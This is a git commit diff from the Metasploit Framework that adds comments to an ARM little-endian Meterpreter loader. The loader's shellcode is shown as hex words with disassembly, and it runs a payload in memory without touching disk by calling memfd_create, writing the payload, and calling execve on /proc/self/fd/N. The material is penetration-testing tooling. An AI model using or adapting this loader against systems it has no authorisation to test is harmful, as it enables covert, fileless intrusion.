639c592fdea502d818ee779e542f7f2c0b001279
Martin Sutovsky <martin_sutovsky@rapid7.com>
2025-04-16 13:14:11 +0200

    Add armbe/armle comments

--- lib/msf/core/payload/linux/armle/meterpreter_loader.rb
+++ lib/msf/core/payload/linux/armle/meterpreter_loader.rb
@@ -7,6 +7,8 @@
 module Msf::Payload::Linux::Armle::MeterpreterLoader
   def in_memory_load(payload)
         in_memory_loader = [
+
+            #memfd_create(null, MFD_CLOEXEC)
 0xe3a02000, #0x1000:	mov	r2, #0	0xe3a02000
 0xe52d2004, #0x1004:	str	r2, [sp, #-4]!	0xe52d2004
 0xe1a0000d, #0x1008:	mov	r0, sp	0xe1a0000d
@@ -14,13 +16,20 @@ module Msf::Payload::Linux::Armle::MeterpreterLoader
 0xe3a07083, #0x1010:	mov	r7, #0x83	0xe3a07083
 0xe28770fe, #0x1014:	add	r7, r7, #0xfe	0xe28770fe
 0xef000000, #0x1018:	svc	#0	0xef000000
+            #save fd to r3
 0xe1a03000, #0x101c:	mov	r3, r0	0xe1a03000
+
+#use branch and branch with linking to get address of payload data
 0xea00001d, #0x1020:	b	#0x109c	0xea00001d
 0xe1a0100e, #0x1024:	mov	r1, lr	0xe1a0100e
+
+#write(fd,payload, payload_length)
 0xe5912000, #0x1028:	ldr	r2, [r1]	0xe5912000
 0xe2811026, #0x102c:	add	r1, r1, #0x26	0xe2811026
 0xe3a07004, #0x1030:	mov	r7, #4	0xe3a07004
 0xef000000, #0x1034:	svc	#0	0xef000000
+
+#use custom itoa to convert fd into string and append it to /proc/self/fd/
 0xe2411002, #0x1038:	sub	r1, r1, #2	0xe2411002
 0xe1a0a001, #0x103c:	mov	sl, r1	0xe1a0a001
 0xe3a0200a, #0x1040:	mov	r2, #0xa	0xe3a0200a
@@ -41,6 +50,7 @@ module Msf::Payload::Linux::Armle::MeterpreterLoader
 0xe24aa001, #0x107c:	sub	sl, sl, #1	0xe24aa001
 0xeafffff9, #0x1080:	b	#0x106c	0xeafffff9
 0xe24aa00d, #0x1084:	sub	sl, sl, #0xd	0xe24aa00d
+#execve(/proc/self/fd/[fd],0,0)
 0xe1a0000a, #0x1088:	mov	r0, sl	0xe1a0000a
 0xe3a01000, #0x108c:	mov	r1, #0	0xe3a01000
 0xe3a02000, #0x1090:	mov	r2, #0	0xe3a02000
